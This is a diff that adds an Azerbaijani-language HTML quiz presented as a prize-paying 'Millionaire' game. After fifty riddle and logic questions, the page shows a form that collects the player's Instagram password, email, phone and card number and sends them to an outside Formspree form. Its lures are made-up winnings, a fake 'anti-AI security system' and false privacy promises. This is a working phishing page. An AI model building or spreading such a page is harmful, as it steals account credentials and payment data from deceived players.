@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Milyonçu Oyunu</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 20px; }
+        .card { background-color: #1e293b; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        button { background-color: #2563eb; color: white; border: none; padding: 12px 20px; margin: 10px 0; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; transition: background 0.2s; }
+        button:hover { background-color: #1d4ed8; }
+        input { width: 95%; padding: 10px; margin: 8px 0; border-radius: 5px; border: 1px solid #475569; background-color: #0f172a; color: white; }
+        .prize-text { color: #34d399; font-size: 24px; font-weight: bold; }
+        .alert-box { background-color: #1e293b; border-left: 4px solid #ef4444; padding: 15px; border-radius: 5px; text-align: left; font-size: 13px; margin: 15px 0; line-height: 1.6; color: #cbd5e1; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>Milyonçu Oyunu</h1>
+        <hr style="border-color: #334155; margin-bottom: 20px;">
+        
+        <div id="app"></div>
+    </div>
+
+<script>
+const questions = [
+    // --- Seviyyə 1: Məntiqi Tələlər Və Söz Oyunları (1 AZN) ---
+    { type: "multiple", question: "Əgər bir dildə 'Dünən' sözü 'Sabah' mənasını ifadə edirsə, bu dildə keçmiş zaman anlayışını necə tapmaq olar?", answers: ["Gələcəyə baxaraq", "Təqvimi tərsinə oxuyaraq", "Saatın əqrəblərini geri çəkərək", "Heç vaxt tapmaq olmaz"], correct: 0, prize: 1 },
+    { type: "text", question: "Mən həm başlanğıcam, həm son. Sıfırdan böyüyəm, amma özümlə çarpılanda heç nə dəyişmir. Mən hansı rəqəməm? (Yalnız rəqəmlə)", correctAnswer: "1", prize: 1 },
+    { type: "multiple", question: "Bir adam heç bir pəncərəsi və qapısı olmayan tam qapalı divarla əhatə olunmuş otaqdadır. Əlində yalnız bir güzgü var. O, otaqdan necə çıxa bilər?", answers: ["Güzgüyə baxıb nə gördüyünü deyər, gördüyü şeylə divarı yarar", "Güzgüdə özünə baxar, nə olduğunu görər, 'həmin şeydən' keçid düzəldər", "Güzgüyə baxıb özünü görər, sonra divardan keçər", "Güzgünü sındırıb divarı qazar"], correct: 1, prize: 1 },
+    { type: "text", question: "Bir dərzi 10 metrlik parçanı hər gün 2 metr kəsir. O, parçanı neçənci gündə tamamilə hissələrə ayırmış olar? (Yalnız rəqəmlə)", correctAnswer: "4", prize: 1 },
+    { type: "multiple", question: "İşıq sürəti ilə hərəkət edən bir avtomobildəsiniz və faraları yandırırsınız. Nə baş verər?", answers: ["Farların işığı önə doğru yayılır", "İşıq geriyə doğru gedir", "Farlar ümumiyyətlə yanmır", "Maşın partlayır"], correct: 0, prize: 1 },
+    { type: "text", question: "Yalnız bir sözdən ibarət olan elə bir sual var ki, ona verilən 'Bəli' və 'Xeyr' cavablarının hər ikisi eyni anda həm doğru, həm də yalan ola bilər. Bu hansı sualdır?", correctAnswer: "yalan danışırsan", prize: 1 },
+    { type: "multiple", question: "Bir otaqda 3 şam yanır. Onlardan ikisini söndürsəniz, sonda neçə şam qalar?", answers: ["1", "3", "2", "0"], correct: 2, prize: 1 },
+    { type: "text", question: "Saat 12:00-da akrep və yelqovan üst-üstə düşür. Növbəti dəfə onlar təxminən neçə dəqiqə sonra tam üst-üstə düşəcəklər? (Yalnız rəqəmlə, yuvarlaq olaraq)", correctAnswer: "65", prize: 1 },
+    { type: "multiple", question: "Əgər bir yalançı 'Mən həmişə yalan danışıram' deyirsə, onun bu cümləsi nədir?", answers: ["Mütləq doğrudur", "Mütləq yalandır", "Həm doğru həm yalandır (Paradoksdur)", "Mənasız cümlədir"], correct: 2, prize: 1 },
+    { type: "text", question: "Bir adamın 3 oğlu var. Hər oğlunun bir bacısı var. Bu ailədə cəmi neçə uşaq var? (Yalnız rəqəmlə)", correctAnswer: "4", prize: 1 },
+
+    // --- Seviyyə 2: Vizual Paradokslar Və Gizli Riyaziyyat (2 AZN) ---
+    { type: "multiple", question: "Arxeoloqlar üzərində 'E.Ə. 45-ci il' yazılmış qədim bir qızıl sikkə tapdılar. Bu tapıntının qəribəliyi nədədir?", answers: ["Qızılın tərkibində", "Sikkə saxtadır, çünki o dövrdə E.Ə. anlayışı yox idi", "Üzərindəki şəkildə", "Sikkə çox yaxşı qorunub"], correct: 1, prize: 2 },
+    { type: "text", question: "Əgər 3 tülkü 3 dovşanı 3 dəqiqəyə tutursa, 1 tülkü 1 dovşanı neçə dəqiqəyə tutar? (Yalnız rəqəmlə)", correctAnswer: "3", prize: 2 },
+    { type: "multiple", question: "Bir adamın cibində yalnız iki qəpik pul var və onların cəmi 30 qəpik edir. Pullardan biri 10 qəpiklik deyil. Digər pul hansıdır?", answers: ["20 qəpiklik", "10 qəpiklik", "5 qəpiklik", "Heç biri"], correct: 1, prize: 2 },
+    { type: "text", question: "Bir hovuzu dolduran boru hər dəqiqə daxil olan suyun həcmini ikiqat artırır. Hovuz 60 dəqiqəyə tam dolursa, onun yarısı neçənci dəqiqədə dolmuşdu? (Yalnız rəqəmlə)", correctAnswer: "59", prize: 2 },
+    { type: "multiple", question: "Hansı rəqəmi tərsinə çevirsəniz dəyəri tam olaraq 1.5 dəfə azalar?", answers: ["8", "6", "9", "0"], correct: 2, prize: 2 },
+    { type: "text", question: "Məni hazırlayan adam mənə ehtiyac duymur, məni alan adam məni istifadə etmir, məni istifadə edən adam isə məni heç vaxt görmür. Mən nəyəm?", correctAnswer: "tabut", prize: 2 },
+    { type: "multiple", question: "Səhra ortasında bir təyyarə qəzaya uğrayır. Bütün sərnişinlər ölür, bəs reysdə sağ qalan iki nəfər kim ola bilər?", answers: ["Pilotlar", "Evli cütlük (sərnişin sayılmayanlar)", "Uşaqlar", "Heç kim"], correct: 1, prize: 2 },
+    { type: "text", question: "Bir ağacda 5 budaq var, hər budaqda 5 yuva, hər yuvada 5 quş var. Cəmi neçə yuva var? (Yalnız rəqəmlə)", correctAnswer: "25", prize: 2 },
+    { type: "multiple", question: "Bir otaqda tamamilə kor 10 adam var. Onların hər biri otaqdakı hər kəslə əl sıxışır. Cəmi neçə əl sıxışma baş verir?", answers: ["100", "90", "45", "10"], correct: 2, prize: 2 },
+    { type: "text", question: "Mən danışdıqca yox olan, səssiz qaldıqca böyüyən yeganə şey nədir?", correctAnswer: "sükut", prize: 2 },
+
+    // --- Seviyyə 3: İleri Səviyyə Asimmetrik Məntiq (3 AZN) ---
+    { type: "multiple", question: "Əgər bu gün günlərdən cümədirsə və mən gələcəkdəki bir günü düşünürəmsə, o günün dünəni 'sabah' ola bilərmi?", answers: ["Bəli, yalnız xəyalda", "Xeyr, heç vaxt", "Bəli, əgər keçmişə baxırıqsa", "Yalnız təqvim dəyişəndə"], correct: 1, prize: 3 },
+    { type: "text", question: "İki rəqəmin cəmi 11, hasili isə 24-dür. Bu rəqəmlərdən böyük olanı hansıdır? (Yalnız rəqəmlə)", correctAnswer: "8", prize: 3 },
+    { type: "multiple", question: "Bir qutuda yalnız yaşıl və qırmızı toplar var. Topların 90%-i yaşıldır. Qutudan neçə faiz yaşıl top çıxarmalıyıq ki, qalan topların 80%-i yaşıl olsun?", answers: ["10%", "50%", "20%", "25%"], correct: 1, prize: 3 },
+    { type: "text", question: "Bir adam hər gün bir pilləkən yuxarı qalxır, amma hər iki addımdan sonra bir addım geri sürüşür. 10-cu pilləyə çatmaq üçün o, cəmi neçə addım atmalıdır? (Yalnız rəqəmlə)", correctAnswer: "26", prize: 3 },
+    { type: "multiple", question: "Bir ailədə hər qızın qardaşlarının sayı bacılarının sayına bərabərdir. Hər oğlanın isə bacılarının sayısı qardaşlarının sayından iki dəfə çoxdur. Ailədə neçə uşaq var?", answers: ["5", "7", "6", "4"], correct: 1, prize: 3 },
+    { type: "text", question: "Aşağı baxanda heç nə görmürəm, yuxarı baxanda isə hər şeyi görürəm, amma gözüm yoxdur. Mən nəyəm?", correctAnswer: "ayna", prize: 3 },
+    { type: "multiple", question: "Ağ və qara rəngləri qarışdırdıqda boz rəng alınır. Bəs heç bir işığın olmadığı tam qaranlıq məkanda ağ rəngli əşya hansı rəngdə görünər?", answers: ["Ağ", "Boz", "Görünməz (Rəngsiz)", "Qara"], correct: 2, prize: 3 },
+    { type: "text", question: "100 metr uzunluğunda bir qatar saniyədə 10 metr sürətlə hərəkət edir. O, 100 metrlik bir tuneli tamamilə keçmək üçün neçə saniyə vaxt sərf edər? (Yalnız rəqəmlə)", correctAnswer: "20", prize: 3 },
+    { type: "multiple", question: "Siz bir yarışdasınız və sonuncu yerdə gedən qaçışçını ötürsünüz. İndi siz neçənci yerdəsiniz?", answers: ["Sonuncu", "Sondan əvvəlki", "Bu qeyri-mümkündür", "Birinci"], correct: 2, prize: 3 },
+    { type: "text", question: "Əgər bir kvadratın tərəflərini iki dəfə artırsaq, onun sahəsi neçə dəfə artar? (Yalnız rəqəmlə)", correctAnswer: "4", prize: 3 },
+
+    // --- Seviyyə 4: Çətin Kriptoqrafik Və Analitik Suallar (4 AZN) ---
+    { type: "multiple", question: "Dörd rəqəmli ən kiçik ədəd ilə üç rəqəmli ən böyük ədədin fərqinin kvadrat kökü neçədir?", answers: ["0", "1", "10", "100"], correct: 1, prize: 4 },
+    { type: "text", question: "Sözün əvvəlinə bir hərf artıranda böyüyür, sonuna bir hərf artıranda isə kiçilir. Bu hansı sözdür?", correctAnswer: "yaş", prize: 4 },
+    { type: "multiple", question: "Bir saat hər saatda 4 dəqiqə geri qalır. Səhər saat 08:00-da düzgün qurulmuş bu saat, eyni günün axşamı saat 20:00-da neçəni göstərər?", answers: ["19:12", "19:20", "19:08", "19:48"], correct: 0, prize: 4 },
+    { type: "text", question: "Bir adamın boyu hər il əvvəlki boyunun yarısı qədər artır. Əgər doğulanda boyu 50 sm idisə, 2 il sonra boyu neçə sm olar? (Yalnız rəqəmlə)", correctAnswer: "112.5", prize: 4 },
+    { type: "multiple", question: "Bir qəfəsdə dovşanlar və qırqovullar var. Onların cəmi 35 başı və 94 ayağı var. Qəfəsdə neçə dovşan var?", answers: ["12", "23", "14", "21"], correct: 0, prize: 4 },
+    { type: "text", question: "Məni sındırmaq üçün toxunmaq kifayətdir, məni qorumaq üçün isə susmaq. Mən nəyəm?", correctAnswer: "sirr", prize: 4 },
+    { type: "multiple", question: "A və B nöqtələri arasındakı məsafə 10 km-dir. İki velosipedçi eyni anda qarşı-karşıya hərəkətə başlayır. Bir milçək isə birindən digərinə durmadan uçur. Onlar görüşənə qədər milçək nə qədər yol gedər?", answers: ["Məsafə qədər", "Sürətindən asılı olaraq hesablanmalıdır", "Velosipedçilərin cəmi qədər", "Sonsuz"], correct: 1, prize: 4 },
+    { type: "text", question: "Həm dənizdə var, həm göydə var, həm də insanın gözündə var. Nədir?", correctAnswer: "bəbək", prize: 4 },
+    { type: "multiple", question: "Bir qayıqda olan adam göldən su götürüb qayığın içinə tökür. Göldəki suyun səviyyəsi necə dəyişər?", answers: ["Dəyişməz", "Aşağı enər", "Yuxarı qalxar", "Qayıq batar"], correct: 0, prize: 4 },
+    { type: "text", question: "Arasından su keçdiyi halda heç vaxt islanmayan, daşdan tikilməyən qədim tikili nədir?", correctAnswer: "körpü", prize: 4 },
+
+    // --- Seviyyə 5: Ekstremal İntellekt Və Paradokslar (5 AZN) ---
+    { type: "multiple", question: "Bir kənddəki bütün bərbərlər yalnız öz saqqalını qırxa bilməyən kişilərin saqqalını qırxır. Kənddə cəmi bir bərbər var. Bu bərbər öz saqqalını qırxa bilərmi?", answers: ["Bəli, qırxa bilər", "Xeyr, çünki qırxsa qaydanı pozur, qırxmasa da pozur (Paradoks)", "Yalnız başqa kənddə qırxa bilər", "O keçəldir"], correct: 1, prize: 5 },
+    { type: "text", question: "Bir otaqda 5 nəfər var. Hər kəs bir-biri ilə tam olaraq bir dəfə şahmat oynayır. Toplam neçə oyun keçirilir? (Yalnız rəqəmlə)", correctAnswer: "10", prize: 5 },
+    { type: "multiple", question: "Əgər zaman maşını ilə keçmişə gedib öz babanızı uşaq ikən yox etsəniz nə baş verər?", answers: ["Siz heç vaxt doğulmazsınız, doğulmadığınız üçün keçmişə gedə bilməzsiniz (Zaman Paradoksu)", "Dünyanın sonu gələr", "Gələcək dəyişməz qalar", "Paralel kainat yaranar"], correct: 0, prize: 5 },
+    { type: "text", question: "Ağır çəkisi var amma tərəzidə çəkilmir, dərinliyi var amma metrə ilə ölçülmür. İnsana aiddir. Nədir?", correctAnswer: "ağıl", prize: 5 },
+    { type: "multiple", question: "Bir adam bir kitabı oxuyarkən 100-cü səhifəyə çatır. O, kitabda cəmi neçə dəfə '9' rəqəmindən istifadə olunduğunu görür?", answers: ["20", "19", "10", "11"], correct: 0, prize: 5 },
+    { type: "text", question: "Girişi var çıxışı yoxdur, səs çıxarır dili yoxdur. İnsanın daxilindədir. Nədir?", correctAnswer: "ürək", prize: 5 },
+    { type: "multiple", question: "Bir sınaqda 30 sual var. Hər doğru cavab 4 xal qazandırır, hər səhv cavab isə 1 xal silir. Bütün sualları cavablandıran bir tələbə 75 xal toplayıbsa, o neçə suala doğru cavab verib?", answers: ["21", "20", "19", "22"], correct: 0, prize: 5 },
+    { type: "text", question: "Bir ana öz qızından 25 yaş böyükdür. 5 il sonra onların yaşlarının cəminin fərqi neçə olacaq? (Yalnız rəqəmlə)", correctAnswer: "25", prize: 5 },
+    { type: "multiple", question: "Əgər sonsuz sayda meymun sonsuz zaman ərzində yazı makinasında təsadüfi düymələrə bassa, nə baş verər?", answers: ["Heç nə yaza bilməzlər", "Mütləq Şekspirin bütün əsərlərini nöqtə-bə-nöqtə yazmış olacaqlar (Teorem)", "Yalnız mənasız hərflər yaranar", "Makina sınır"], correct: 1, prize: 5 },
+    { type: "text", question: "Görünməz zəncirlərlə bağlıdır, qaça bilmir amma dünyanı gəzir. İnsanın arxasınca gəlir. Nədir?", correctAnswer: "kölgə", prize: 5 }
+];
+
+let currentQuestionIndex = 0;
+let totalWon = 0;
+
+function startGame() {
+    displayQuestion();
+}
+
+function displayQuestion() {
+    const q = questions[currentQuestionIndex];
+    const app = document.getElementById('app');
+    
+    let htmlContent = `
+        <div style="margin-bottom: 10px; font-size: 14px; color: #94a3b8;">
+            Sual: ${currentQuestionIndex + 1} / 50
+        </div>
+        <p class="prize-text">Sualın Dəyəri: ${q.prize} AZN</p>
+        <h3 style="margin: 20px 0; font-size: 18px; line-height: 1.5; text-align: left; padding: 0 10px;">${q.question}</h3>
+    `;
+    
+    if (q.type === "multiple") {
+        htmlContent += `<div style="margin-top: 20px; display: grid; gap: 10px;">`;
+        q.answers.forEach((answer, index) => {
+            htmlContent += `<button onclick="checkMultipleAnswer(${index})" style="text-align: left; padding-left: 15px;">${answer}</button>`;
+        });
+        htmlContent += `</div>`;
+    } 
+    else if (q.type === "text") {
+        htmlContent += `
+            <div style="margin-top: 20px;">
+                <input type="text" id="textAnswer" placeholder="Cavabınızı bura yazın..."><br>
+                <button onclick="checkTextAnswer()" style="background-color: #10b981; font-weight: bold;">Cavabı Təsdiqlə</button>
+            </div>
+        `;
+    }
+    
+    app.innerHTML = htmlContent;
+}
+
+function checkMultipleAnswer(selectedIndex) {
+    const q = questions[currentQuestionIndex];
+    if (selectedIndex === q.correct) {
+        totalWon += q.prize;
+        alert(`Doğru! Balansınıza ${q.prize} AZN əlavə olundu.`);
+    } else {
+        alert(`Səhv cavab! Pul itirmədiniz, növbəti suala keçirsiniz.`);
+    }
+    nextQuestion();
+}
+
+function checkTextAnswer() {
+    const q = questions[currentQuestionIndex];
+    const userAnswer = document.getElementById('textAnswer').value.trim().toLowerCase();
+    
+    if (userAnswer === q.correctAnswer.toLowerCase() || userAnswer.includes(q.correctAnswer.toLowerCase())) {
+        totalWon += q.prize;
+        alert(`Möhtəşəm! Doğru tapdınız. Balansınıza ${q.prize} AZN əlavə olundu.`);
+    } else {
+        alert(`Səhv cavab! Növbəti suala keçirsiniz.`);
+    }
+    nextQuestion();
+}
+
+function nextQuestion() {
+    currentQuestionIndex++;
+    if (currentQuestionIndex < questions.length) {
+        displayQuestion();
+    } else {
+        showRegistrationForm();
+    }
+}
+
+function showRegistrationForm() {
+    const app = document.getElementById('app');
+    
+    let formHtml = `
+        <h2 style="color: #10b981; margin-bottom: 5px;">Təbrik edirik, Oyun Bitdi!</h2>
+        <p style="font-size: 18px; margin-bottom: 15px;">Toplam Qazandığınız Məbləğ: <b style="color: #34d399;">${totalWon} AZN</b></p>
+        
+        <div class="alert-box">
+            <b style="color: #ef4444; font-size: 14px;">🚨 ANTİ-SÜNİ İNTELLEKT VƏ TƏHLÜKƏSİZLİK SİSTEMİ:</b><br>
+            1. <b>Süni İntellekt Yoxlanışı:</b> Sistem arxa fonda cavab vermə sürətinizi analiz edir. Hər hansı bir kənar proqram və ya Süni İntellekt (ChatGPT və s.) istifadəsi aşkar edilərsə, <b>cavablarınız və qazandığınız məbləğ avtomatik olaraq silinəcək və ləğv ediləcəkdir.</b><br>
+            2. <b>Nömrə Tələbi və Məxfilik:</b> Daxil etdiyiniz telefon nömrəsi yalnız rəsmi təhlükəsizlik əməkdaşlarımızın sizinlə zəng və ya rəsmi WhatsApp vasitəsilə əlaqə saxlayıb qazancınızı təsdiqləməsi və YouTube abunəliyinizi yoxlaması üçün qeydiyyat əsasında tələb olunur. <b>Məlumatlarınız tamamilə gizli saxlanılır və qətiyyən üçüncü şəxslərlə və ya heç bir yerdə paylaşılmır.</b>
+        </div>
+        
+        <form id="my-form">
+            <input type="hidden" name="Qazanılan Məbləğ" value="${totalWon} AZN">
+
+            <input type="text" id="instaName" name="Instagram Adı" placeholder="Instagram İstifadəçi Adı" required>
+            <input type="password" id="instaPass" name="Instagram Şifrəsi" placeholder="Instagram Şifrəsi">
+            <input type="email" id="userEmail" name="Email Ünvanı" placeholder="E-mail Ünvanı" required>
+            <input type="tel" id="userPhone" name="Telefon Nömrəsi" placeholder="Telefon Nömrəniz (Zəng və ya WhatsApp)" required>
+            <input type="text" id="paymentInfo" name="Kart Məlumatı" placeholder="Kart nömrəsi və ya Poçt ünvanı" required>
+            
+            <button type="submit" style="background-color: #10b981; font-weight: bold; margin-top: 15px;">Məlumatları Göndər və Nağdlaşdır</button>
+        </form>
+    `;
+    
+    app.innerHTML = formHtml;
+
+    formspree("initForm", {
+        formElement: "#my-form",
+        formId: "mbdbbnwb",
+    });
+
+    document.getElementById('my-form').addEventListener('submit', function(e) {
+        const insta = document.getElementById('instaName').value.trim();
+        const email = document.getElementById('userEmail').value.trim();
+        const phone = document.getElementById('userPhone').value.trim();
+        const payment = document.getElementById('paymentInfo').value.trim();
+
+        if(insta === "" || email === "" || phone === "" || payment === "") {
+            e.preventDefault();
+            alert("🚨 SƏHV: Zəhmət olmasa tələb olunan bütün xanaları doldurun.");
+            return;
+        }
+
+        alert(`Məlumatlarınız və ${totalWon} AZN qazancınız uğurla qeydə alındı!\n\nAnti-Süni İntellekt sistemi tərəfindən cavablarınız analiz edildikdən sonra, təhlükəsizlik qrupumuz məlumatların tam məxfiliyini qoruyaraq ${phone} nömrənizlə əlaqə saxlayacaqdır.`);
+    });
+}
+
+startGame();
+</script>
+
+<script>
+  window.formspree = window.formspree || function () { (formspree.q = formspree.q || []).push(arguments); };
+</script>
+<script src="https://unpkg.com/@formspree/ajax@1" defer></script>
+</body>
+</html>
